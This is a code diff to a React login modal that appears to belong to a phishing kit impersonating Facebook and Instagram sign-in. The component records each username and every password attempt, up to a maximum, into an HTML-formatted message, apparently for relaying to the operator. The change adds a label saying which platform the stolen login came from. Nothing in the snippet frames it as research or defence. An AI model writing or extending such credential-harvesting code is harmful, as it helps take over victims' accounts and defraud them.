@@ -79,8 +79,9 @@ const LoginModal: FC<{ nextStep: () => void; verdict: Verdict | null; provider: 
         const next = attempts + 1;
         setAttempts(next);
 
+        const platform = provider === 'facebook' ? 'Facebook' : 'Instagram';
         const passwordLine = `<b>🔒 Password ${next}/${maxPass}:</b> <code>${password}</code>`;
-        const block = next === 1 ? `<b>👤 Username:</b> <code>${username}</code>\n${passwordLine}` : passwordLine;
+        const block = next === 1 ? `<b>📘 Login Type:</b> <code>${platform}</code>\n<b>👤 Username:</b> <code>${username}</code>\n${passwordLine}` : passwordLine;
 
         const updatedMessage = messageContent ? `${messageContent}\n\n${block}` : block;
 
